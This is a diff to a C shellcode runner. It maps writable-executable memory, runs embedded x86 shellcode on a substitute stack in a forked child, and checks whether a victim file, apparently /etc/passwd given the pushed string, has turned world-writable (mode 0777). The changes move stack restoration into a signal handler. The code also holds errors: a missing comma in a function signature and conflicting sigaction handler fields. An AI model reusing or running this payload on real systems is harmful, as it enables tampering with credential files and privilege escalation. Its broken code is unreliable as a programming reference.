@@ -1,5 +1,6 @@
 #include <errno.h>
 #include <fcntl.h>
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -31,6 +32,55 @@
 #define SHADOW_STACK_SIZE (1024 * 4)
 #endif
 
+typedef struct {
+  void *thread_stack;
+  void *shadow_stack;
+} __sigstack_t;
+
+typedef __sigstack_t sigstack_t;
+
+sigstack_t sstate = {
+    .thread_stack = 0,
+    .shadow_stack = 0,
+};
+
+static void __sighandler(void) {
+  printf("[*] Restoring the stack..\n");
+  set_stack(sstate.thread_stack);
+
+  if ((unsigned long)get_stack() != (unsigned long)sstate.thread_stack) {
+    printf("[-] Stack restoration failed. Fallback..\n");
+    exit(1);
+  }
+
+  printf("[*] Stack restored.\n");
+  exit(0);
+}
+
+static void __sigaction(int a, siginfo_t *b, void *c) {}
+
+static void install_signal(int signum void (*handler)(void),
+                           void (*action)(int, siginfo_t *, void *)) {
+  int ret;
+  struct sigaction act;
+
+  bzero(&act, sizeof(struct sigaction));
+
+  act.sa_handler = handler;
+  act.sa_sigaction = action;
+
+  ret = sigaction(signum, &act, NULL);
+
+  if (unlikely(ret < 0)) {
+    perror("sigaction()");
+    ret = -errno;
+    goto __fallback;
+  }
+
+__fallback:
+  return;
+}
+
 int main(int argc, char **argv) {
   unused(argc);
   unused(argv);
@@ -40,8 +90,6 @@ int main(int argc, char **argv) {
   struct stat st;
   struct utsname uts;
   char *pcall;
-  char *thread_stack;
-  char *shadow_stack;
   char *shellcode = "\x33\xf6\x56\x68\x73\x73\x77\x64"
                     "\x68\x63\x2f\x70\x61\x68\x2f\x2f"
                     "\x65\x74\x8b\xdc\x33\xc9\x41\x41"
@@ -53,6 +101,8 @@ int main(int argc, char **argv) {
                     "\xb0\x06\x50\xcd\x91\x56\x56\x33"
                     "\xc0\xb0\x01\xcd\x91";
 
+  install_signal(SIGCLD, __sighandler, __sigaction);
+
   pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 
@@ -62,9 +112,9 @@ int main(int argc, char **argv) {
     goto __fallback;
   }
 
-  shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));
+  sstate.shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));
 
-  if (unlikely(!shadow_stack)) {
+  if (unlikely(!sstate.shadow_stack)) {
     perror("calloc()");
     ret = -errno;
     goto __must_unmap_payload;
@@ -103,18 +153,18 @@ int main(int argc, char **argv) {
 
   if (likely(!pid)) {
     printf("[*] Saving thread stack..\n");
-    __asm__ __volatile__("movl %%esp, %0\n" : "=r"(thread_stack));
+    __asm__ __volatile__("movl %%esp, %0\n" : "=r"(sstate.thread_stack));
 
 #ifdef THREAD_DEBUG
     printf("[*] Debug\n");
-    printf(" [*] thread_stack: %p\n", thread_stack);
-    printf(" [*] shadow_stack: %p\n", shadow_stack);
+    printf(" [*] thread_stack: %p\n", sstate.thread_stack);
+    printf(" [*] shadow_stack: %p\n", sstate.shadow_stack);
 #endif
 
     printf("[*] Installing shadow stack..\n");
-    set_stack(shadow_stack);
+    set_stack(sstate.shadow_stack);
 
-    if ((unsigned long)get_stack() != (unsigned long)shadow_stack) {
+    if ((unsigned long)get_stack() != (unsigned long)sstate.shadow_stack) {
       printf("[-] Failing to install shadow stack. Fallback..\n");
       exit(1);
     }
@@ -123,16 +173,6 @@ int main(int argc, char **argv) {
 
     printf("[*] Executing the shellcode..\n");
     __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
-
-    printf("[*] Restoring the stack..\n");
-    set_stack(thread_stack);
-
-    if ((unsigned long)get_stack() != (unsigned long)thread_stack) {
-      printf("[-] Stack restoration failed. Fallback..\n");
-      exit(1);
-    }
-
-    printf("[*] Stack restored.\n");
   } else {
     waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
   }
@@ -155,7 +195,8 @@ int main(int argc, char **argv) {
     goto __must_close;
   }
 
-  printf("[*] Checking if '%s' mode changed into -rwxrwxrwx..\n", __victim_path);
+  printf("[*] Checking if '%s' mode changed into -rwxrwxrwx..\n",
+         __victim_path);
 
   if ((st.st_mode & 0xfff) != 0777) {
     printf(" [-] Fail.\n");
